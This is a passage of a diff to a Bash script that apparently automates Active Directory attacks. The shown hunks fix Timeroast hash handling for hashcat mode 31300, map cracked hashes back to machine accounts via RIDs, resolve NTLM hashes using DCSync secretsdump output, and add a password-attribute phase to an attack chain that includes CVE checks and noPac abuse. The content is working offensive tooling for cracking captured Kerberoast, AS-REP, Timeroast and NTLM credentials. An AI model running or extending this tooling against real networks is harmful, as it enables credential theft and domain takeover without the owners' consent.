             Kerberoast) k=$(grep -oP '\$krb5tgs\$[0-9]+\$\*?\K[^$*]+'  <<<"$line" | head -1) ;;
-            Timeroast)  k=$(grep -oP '\$sntp-ms\$[^$]*\$\K[^$: ]+'     <<<"$line" | head -1) ;;
+            Timeroast)  k="${line%%:*}" ;;   # dedup by RID — the account identity
             *)          k="$line" ;;
         esac
         [[ -z "$k" ]] && k="$line"
@@ -5851,24 +6198,29 @@ crack_hashes() {
     fi
 
     subsection "Cracking $label (hashcat -m $mode)"
+    # MS-SNTP (Timeroast, 31300) hashes are prefixed with the account RID
+    # (`<RID>:$sntp-ms$…`). hashcat only parses the bare hash, so --username tells it to
+    # strip (and remember) that RID field — without it every line is "Separator
+    # unmatched". Every other mode here is fed the bare hash, so --username stays off.
+    local -a hcx=(); [[ "$mode" == 31300 ]] && hcx=(--username)
     # Hashcat's progress noise (Status/Speed/Started/Stopped/potfile banners) is sent
     # ONLY to the logfile — the terminal stays clean and just shows the verdict below
     # (cracked creds in green, or "Nothing cracked"). Full output still in adautopwn.log.
     # 1) domain-focused candidates first (fast, high hit-rate), then rockyou
     if [[ -s "$DOMAIN_WL" ]]; then
-        run "hashcat -m $mode <file> domain_wordlist.txt -O"
-        hashcat -m "$mode" "$work" "$DOMAIN_WL" -O >>"$LOGFILE" 2>&1
+        run "hashcat -m $mode <file> domain_wordlist.txt -O ${hcx[*]}"
+        hashcat -m "$mode" "${hcx[@]}" "$work" "$DOMAIN_WL" -O >>"$LOGFILE" 2>&1
     fi
     if [[ -f "$WORDLIST" ]]; then
-        run "hashcat -m $mode <file> $WORDLIST -O"
-        hashcat -m "$mode" "$work" "$WORDLIST" -O >>"$LOGFILE" 2>&1
+        run "hashcat -m $mode <file> $WORDLIST -O ${hcx[*]}"
+        hashcat -m "$mode" "${hcx[@]}" "$work" "$WORDLIST" -O >>"$LOGFILE" 2>&1
     elif [[ ! -s "$DOMAIN_WL" ]]; then
         warn "No wordlist available, skipping $label cracking"; rm -f "$work"; return
     fi
     # `--show` prints parser errors ("Separator unmatched", "No hashes loaded"…) to
     # STDOUT too, so a wrong -m would otherwise be reported as a "cracked" credential.
     # Keep only real potfile lines (hash<colon>plaintext), dropping hashcat chatter.
-    local cracked; cracked=$(hashcat -m "$mode" "$work" --show 2>/dev/null \
+    local cracked; cracked=$(hashcat -m "$mode" "${hcx[@]}" "$work" --show 2>/dev/null \
         | grep -viE 'Separator unmatched|Hashfile|No hashes|hashes loaded|Parsing|Count(ing|ed) lines|^Started:|^Stopped:' \
         | grep ':'); rm -f "$work"
     if [[ -n "$cracked" ]]; then
@@ -5883,7 +6235,13 @@ crack_hashes() {
             case "$label" in
                 AS-REP)     user=$(echo "$line" | grep -oP '\$krb5asrep\$[0-9]+\$\K[^@]+') ;;
                 Kerberoast) user=$(echo "$line" | grep -oP '\$krb5tgs\$[0-9]+\$\*?\K[^$*]+') ;;
-                Timeroast)  user=$(echo "$line" | grep -oP '\$sntp-ms\$[^$]*\$\K[^$: ]+' | head -1) ;;
+                Timeroast)  # `--username --show` line is "<RID>:$sntp-ms$…:<plaintext>".
+                            # The identity is the machine account behind that RID, not any
+                            # slice of the salt (the old regex grabbed salt bytes). Resolve
+                            # it via the RID→account map and hand back a real "<NAME>$".
+                            local _rid="${line%%:*}" _mapf="$OUTDIR/timeroast_map.txt"
+                            user=""; [[ -s "$_mapf" ]] && user=$(awk -F'\t' -v r="$_rid" '$1==r{print $2; exit}' "$_mapf")
+                            [[ -n "$user" && "$user" != *\$ ]] && user="${user}\$" ;;
                 NTLM)       # map NT hash back to a username via the DCSync output
                     local nt="${line%%:*}"
                     user=$(grep -iE ":${nt}:::" "$OUTDIR/secretsdump.txt" 2>/dev/null | head -1 | cut -d: -f1) ;;
@@ -7227,9 +7585,11 @@ final_summary() {
         fi
 
         if [[ -s "$OUTDIR/timeroast_hashes.txt" ]]; then
-            detail "  ${C_BOLD}${C_YELLOW}» Timeroastable machine accounts${C_RESET} ${C_DIM}($(wc -l <"$OUTDIR/timeroast_hashes.txt") — hashcat -m 31300)${C_RESET}"
-            while IFS= read -r h; do local w; w=$(echo "$h" | grep -oiP '\$sntp-ms\$[^$]*\$\K[^$: ]+' | head -1)
-                detail "      ${C_CYAN}${w:-?}${C_RESET}  ${C_DIM}${h:0:54}…${C_RESET}"; done <"$OUTDIR/timeroast_hashes.txt"
+            detail "  ${C_BOLD}${C_YELLOW}» Timeroastable machine accounts${C_RESET} ${C_DIM}($(wc -l <"$OUTDIR/timeroast_hashes.txt") — hashcat -m 31300 --username)${C_RESET}"
+            local _tmap="$OUTDIR/timeroast_map.txt"
+            while IFS= read -r h; do local w rid="${h%%:*}"; w=""
+                [[ -s "$_tmap" ]] && w=$(awk -F'\t' -v r="$rid" '$1==r{print $2; exit}' "$_tmap")
+                detail "      ${C_CYAN}${w:-RID $rid}${C_RESET}  ${C_DIM}${h:0:54}…${C_RESET}"; done <"$OUTDIR/timeroast_hashes.txt"
         fi
 
         if [[ -n "$dd" ]]; then
@@ -7337,6 +7697,7 @@ assess_current_credential() {
     fi
 
     phase_auth_enum;    jitter
+    phase_attr_passwords; jitter
     phase_attack_surface; jitter
     phase_cve_checks;   jitter
     phase_nopac_abuse;  jitter
